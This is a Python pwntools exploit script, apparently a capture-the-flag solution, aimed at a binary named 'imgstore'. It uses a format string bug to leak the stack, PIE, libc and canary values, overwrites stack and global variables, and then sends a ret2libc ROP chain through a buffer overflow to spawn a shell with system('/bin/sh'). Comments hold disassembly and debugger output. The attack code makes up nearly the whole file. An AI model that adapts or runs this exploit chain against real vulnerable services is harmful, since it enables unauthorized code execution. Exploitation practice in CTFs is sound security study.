from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a , **kw)
    else:
    	return process([exe] + argv)
    
gdbscript = """
breakrva 0x1ee1
continue
""".format(**locals())

'''
00101ec1 48 8d 45 b0     LEA        RAX=>local_58,[RBP + -0x50]
00101ec5 48 89 c7        MOV        RDI,RAX
00101ec8 b8 00 00        MOV        EAX,0x0
			00 00
00101ecd e8 ce f2        CALL       <EXTERNAL>::printf                               int printf(char * __format, ...)
			ff ff
00101ed2 48 8d 3d        LEA        RDI,[DAT_00103008]
			2f 11 00 00
00101ed9 e8 a2 f2        CALL       <EXTERNAL>::puts                                 int puts(char * __s)
			ff ff
00101ede 8b 45 a8        MOV        EAX,dword ptr [RBP + local_60]
00101ee1 69 c0 23        IMUL       EAX,EAX,0x13f5c223
			c2 f5 13
00101ee7 8b 15 63        MOV        EDX,dword ptr [DAT_00106050]                     = FEEDBEEFh
			41 00 00
00101eed 39 d0           CMP        EAX,EDX
00101eef 75 17           JNZ        LAB_00101f08
00101ef1 c7 05 91        MOV        dword ptr [DAT_0010608c],0x2
			41 00 00 
			02 00 00 00
'''
    
exe = './imgstore'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'
# context.log_level = 'ERROR'

# library = '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
# library = '/lib/x86_64-linux-gnu/libc.so.6'
library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)

## GET FORMAT STRINGS OFFSET
sh = process(exe)
sh.sendlineafter(b'>',  b'3')
def exploit(fmtpayload):
	# sh = process(exe)
	sh.sendlineafter(b':', fmtpayload)
	sh.recvuntil(b'--> ')
	get = sh.recvline().strip()
	sh.sendlineafter(b':', b'y')
	return get

format_strings = FmtStr(execute_fmt=exploit)
log.success(f'FOUND OFFSET AT --> %d', format_strings.offset)

'''
[+] Starting local process './imgstore': pid 331349
[*] Found format string offset: 8
[+] FOUND OFFSET AT --> 8
[+] Starting local process './imgstore': pid 331359
'''

sh = start()
# pause()
# FUZZING
# for i in range(100):
# 	sh = process(exe)
# 	sh.sendlineafter(b'>', b'3')
# 	sh.sendlineafter(b':', '%{}$p'.format(i))
# 	sh.recvuntil(b'-> ')
# 	get = sh.recvline().strip()
# 	print(str(i), ':', get)
# PIE --> 6, stack --> 1, libc --> 9

sh.sendlineafter(b'>', b'3')

## LEAKING CANARY, PIE, AND LIBC
sh.sendlineafter(b':', '%1$p.%6$p.%11$p.%21$p')
sh.recvuntil(b'-> ')
get = sh.recvline().strip()
# print('dapet --> ', get)

leaked_stack = get[:14]
# print(leaked_stack)
leaked_stack = int(leaked_stack, 16)
log.success(f'LEAKED STACK ADDRESS --> {hex(leaked_stack)}')
leaked_pie = get[15:29]
# print(leaked_pie)
leaked_pie = int(leaked_pie, 16)
log.success(f'LEAKED PIE --> {hex(leaked_pie)}')
leaked_libc = get[30:44]
leaked_libc = int(leaked_libc, 16)
log.success(f'LEAKED LIBC --> {hex(leaked_libc)}')
# print(leaked_libc)

'''
[+] LEAKED STACK ADDRESS --> 0x7ffe06a68d80
[+] LEAKED PIE --> 0x55b38e0dc060
[+] LEAKED LIBC --> 0x7f015c7386a0
[+] LEAKED CANARY --> 0x92f31432c220a200
[*] BASE ADDRESS --> 0x55b38e0d6000
[*] LIBC BASE --> 0x7f015c54b000
[-] -- 
[*] Result address --> 0x55b38e0dc050
[+] Calculated stack address --> 0x7ffe06a6b428
'''

leaked_canary = get[45:]
leaked_canary = int(leaked_canary, 16)
log.success(f'LEAKED CANARY --> {hex(leaked_canary)}')
# print(leaked_canary)

## CALCULATING PIE AND LIBC BASE
elf.address = leaked_pie - 0x6060
log.info(f'BASE ADDRESS --> {hex(elf.address)}')
libc.address = leaked_libc - 0x1ed6a0
log.info(f'LIBC BASE --> {hex(libc.address)}')
# gdb.attach(sh)
print("[-] -- ")

## ============= ##
## == EXPLOIT == ##
## ============= ##

## CALCULATING RESULT ADDRESS AND STACK ADDRESS (for random value)
result_addr = elf.address + 0x6050
log.info(f'Result address --> {hex(result_addr)}')

calculated_stack_addr = leaked_stack + 9896
log.success(f'Calculated stack address --> {hex(calculated_stack_addr)}')

'''
────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────
 ► 0x7f015c6591f2 <read+18>     cmp    rax, -0x1000
   0x7f015c6591f8 <read+24>     ja     read+112                <read+112>
    ↓
   0x7f015c659250 <read+112>    mov    rdx, qword ptr [rip + 0xddc19]
   0x7f015c659257 <read+119>    neg    eax
   0x7f015c659259 <read+121>    mov    dword ptr fs:[rdx], eax
   0x7f015c65925c <read+124>    mov    rax, 0xffffffffffffffff
   0x7f015c659263 <read+131>    ret    
 
   0x7f015c659264 <read+132>    mov    rdx, qword ptr [rip + 0xddc05]
   0x7f015c65926b <read+139>    neg    eax
   0x7f015c65926d <read+141>    mov    dword ptr fs:[rdx], eax
   0x7f015c659270 <read+144>    mov    rax, 0xffffffffffffffff
─────────────────────────────────────────[ STACK ]──────────────────────────────────────────
00:0000│ rsp 0x7ffe06a6aba8 —▸ 0x7f015c5dbb9f (_IO_file_underflow+383) ◂— test rax, rax
01:0008│     0x7ffe06a6abb0 —▸ 0x7ffe06a6b270 —▸ 0x7ffe06a6b470 —▸ 0x55b38e0d82b0 ◂— endbr64                                                                                            
02:0010│     0x7ffe06a6abb8 ◂— 0x0
03:0018│     0x7ffe06a6abc0 —▸ 0x7f015c73d000 —▸ 0x7f015c54b000 ◂— 0x3010102464c457f
04:0020│     0x7ffe06a6abc8 —▸ 0x7f015c737980 (_IO_2_1_stdin_) ◂— 0xfbad208b
05:0028│     0x7ffe06a6abd0 —▸ 0x7f015c7344a0 (_IO_file_jumps) ◂— 0x0
06:0030│     0x7ffe06a6abd8 ◂— 0x63 /* 'c' */
07:0038│     0x7ffe06a6abe0 —▸ 0x55b38e0d98a9 ◂— 0x205d2d5b73250063 /* 'c' */
───────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
 ► 0   0x7f015c6591f2 read+18
   1   0x7f015c5dbb9f _IO_file_underflow+383
   2   0x7f015c5dcf86 _IO_default_uflow+54
   3   0x7f015c5b3897
   4   0x7f015c5ae162 __isoc99_scanf+178
   5   0x55b38e0d7f3d
   6   0x55b38e0d81b8
   7   0x55b38e0d82a3

'''
# gdb.attach(sh)

sh.sendlineafter(b']:', b'y')

## ======================================= ##
## 			OVERWRITING STACK VAR		   ##
## ======================================= ##

format_strings.write(calculated_stack_addr, 0)
format_strings.write(result_addr, 0)
format_strings.execute_writes()

sh.sendlineafter(b']:', b'y')
sh.sendlineafter(b'le:', b'a')

padding = 0x68 
junk = asm('nop') * 0x8

rop = ROP(elf)
rdi_gadget = elf.address + rop.find_gadget(['pop rdi', 'ret'])[0]
ret = elf.address + rop.find_gadget(['ret'])[0]

## GETTING RCE

libcrop = ROP(libc)
libcrop.call(rop.find_gadget(['ret'])[0])
libcrop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
payload = asm('nop') * padding
payload += pack(leaked_canary)
payload += junk
payload += libcrop.chain()

print("[-] -- ")
log.info(libcrop.dump())

'''
[*] Result address --> 0x555ca852c050
[+] Calculated stack address --> 0x7ffde97397d8
[*] Loaded 17 cached gadgets for './imgstore'
[*] Loaded 195 cached gadgets for './libc.so.6'
[-] -- 
[*] 0x0000:   0x555ca852701a 0x555ca852701a()
    0x0008:   0x7f42298e5b6a pop rdi; ret
    0x0010:   0x7f4229a765bd [arg0] rdi = 139922143405501
    0x0018:   0x7f4229914290
'''

sh.sendlineafter(b'>', payload)
sh.interactive()

sh.interactive()
